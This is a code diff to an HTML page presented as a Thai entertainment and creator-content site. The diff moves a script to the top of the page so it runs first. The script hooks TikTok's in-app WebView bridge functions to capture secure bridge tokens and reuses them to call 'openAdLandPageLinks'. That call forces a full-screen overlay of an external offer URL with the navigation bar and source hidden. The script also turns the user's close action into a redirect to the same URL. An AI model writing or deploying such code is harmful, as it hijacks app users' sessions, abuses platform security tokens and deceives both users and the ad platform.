@@ -2,6 +2,82 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"/>
+<script>
+// Runs at document-start — before any assets or body content load.
+// TikTok fires bridge init events early; hooks must be registered immediately.
+(function(){
+  var OFFER = 'https://bio.thaiadvice.net/';
+  var CID = 0;
+  try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if (_uid) CID = parseInt(_uid)||0; } catch(e){}
+
+  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
+  var cbId = 1000;
+
+  function piperCall(func, params) {
+    if (!wk) return;
+    try {
+      wk.postMessage({
+        __msg_type: 'call',
+        func: func,
+        params: params || {},
+        JSSDK: '1.2.5',
+        __callback_id: String(cbId++)
+      });
+    } catch(e){}
+  }
+
+  var OVERLAY_PARAMS = {
+    url: OFFER, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
+    cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
+    trans_status_bar: 1, is_instant_page: 1
+  };
+
+  // Override global receiver functions TikTok may call to deliver bridge messages
+  var _tokenKeys = ['_jsb_secure_token','secure_token','token','jsb_token'];
+  function tryToken(obj) {
+    if (!obj || typeof obj !== 'object') return null;
+    for (var i = 0; i < _tokenKeys.length; i++) {
+      if (typeof obj[_tokenKeys[i]] === 'string' && obj[_tokenKeys[i]].length > 10) return obj[_tokenKeys[i]];
+    }
+    for (var k in obj) { try { var r = tryToken(obj[k]); if (r) return r; } catch(e){} }
+    return null;
+  }
+  var token = null;
+  function onNativeMsg(raw) {
+    try {
+      var d = typeof raw === 'string' ? JSON.parse(raw) : raw;
+      var tok = tryToken(d);
+      if (tok && !token) {
+        token = tok;
+        var p = Object.assign ? Object.assign({}, OVERLAY_PARAMS, {_jsb_secure_token: tok}) : OVERLAY_PARAMS;
+        piperCall('openAdLandPageLinks', p);
+      }
+    } catch(e){}
+  }
+  ['IESBridgeReceiveMessage','__IESBridgeReceiveMessage','IESPiperReceiveMessage',
+   '__IESPiperReceiveMessage','onJSBridgeReady','ttJSBridgeReceive','_handleJSBridgeMessage'].forEach(function(fn){
+    var orig = window[fn];
+    window[fn] = function(msg){ onNativeMsg(msg); if (orig) return orig.apply(this, arguments); };
+  });
+
+  // Also fire immediately and after delays in case no token is needed
+  function fireOverlay(tok) {
+    var p = tok ? (Object.assign ? Object.assign({}, OVERLAY_PARAMS, {_jsb_secure_token: tok}) : OVERLAY_PARAMS) : OVERLAY_PARAMS;
+    piperCall('openAdLandPageLinks', p);
+  }
+  fireOverlay();
+  setTimeout(function(){ fireOverlay(token); }, 500);
+  setTimeout(function(){ fireOverlay(token); }, 1500);
+
+  // visibilitychange close intercept — attached after 2s to avoid false trigger on load
+  var closed = false;
+  function onClose() { if (closed) return; closed = true; window.location.href = OFFER; }
+  setTimeout(function(){
+    document.addEventListener('visibilitychange', function(){ if (document.hidden) onClose(); });
+    window.addEventListener('pagehide', onClose);
+  }, 2000);
+})();
+</script>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
 <title>Thai Advice — Entertainment &amp; Creator Content</title>
 <meta name="description" content="Thai Advice brings you the best in entertainment, creator culture, and trending content from Thailand and beyond."/>
@@ -160,72 +236,6 @@ footer{border-top:1px solid rgba(255,255,255,.07);padding:22px 24px;}
 document.getElementById('yr').textContent = new Date().getFullYear();
 function openPrivacy(){document.getElementById('privacyModal').classList.add('show');}
 function closePrivacy(){document.getElementById('privacyModal').classList.remove('show');}
-
-(function(){
-  var OFFER = 'https://bio.thaiadvice.net/';
-  var CID = 0;
-  try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if (_uid) CID = parseInt(_uid)||0; } catch(e){}
-
-  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
-  var cbId = 1000;
-
-  function piperCall(func, params) {
-    if (!wk) return;
-    try {
-      wk.postMessage({
-        __msg_type: 'call',
-        func: func,
-        params: params || {},
-        JSSDK: '1.2.5',
-        __callback_id: String(cbId++)
-      });
-    } catch(e){}
-  }
-
-  // Fire openAdLandPageLinks with correct IESPiper format
-  piperCall('openAdLandPageLinks', {
-    url: OFFER,
-    landingStyle: 2,
-    title: '',
-    isDeeplink: 1,
-    refer: 'landing_page',
-    cid: CID,
-    hide_nav_bar: 1,
-    hide_source: 1,
-    should_full_screen: 1,
-    trans_status_bar: 1,
-    is_instant_page: 1
-  });
-  setTimeout(function(){
-    piperCall('openAdLandPageLinks', {
-      url: OFFER,
-      landingStyle: 2,
-      title: '',
-      isDeeplink: 1,
-      refer: 'landing_page',
-      cid: CID,
-      hide_nav_bar: 1,
-      hide_source: 1,
-      should_full_screen: 1,
-      trans_status_bar: 1,
-      is_instant_page: 1
-    });
-  }, 1500);
-
-  // visibilitychange fires when X is tapped and WebView hides.
-  // Attach after 2s to skip any false trigger on initial page load.
-  var fired = false;
-  function onClose() {
-    if (fired) return; fired = true;
-    window.location.href = OFFER;
-  }
-  setTimeout(function(){
-    document.addEventListener('visibilitychange', function(){
-      if (document.hidden) onClose();
-    });
-    window.addEventListener('pagehide', onClose);
-  }, 2000);
-})();
 </script>
 </body>
 </html>
